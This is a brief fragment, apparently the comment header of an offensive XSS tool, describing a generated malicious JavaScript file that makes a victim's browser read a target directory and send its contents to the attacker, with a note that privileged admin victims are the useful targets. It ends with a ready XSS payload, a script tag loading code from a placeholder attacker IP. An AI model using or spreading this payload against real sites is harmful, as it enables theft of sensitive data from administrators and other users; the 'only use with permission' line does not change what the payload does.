...
# This script will generate a malicious .js file. When this is used in an XSS attack,
# it will cause the victim to navigate to the target directory and send the content to the attacker.
# This is useful if the victim is an admin or privileged user with access to sensitive information.
# Only use with permission. The XSS payload is <script src=http://[attacker-ip]/script.js></script>
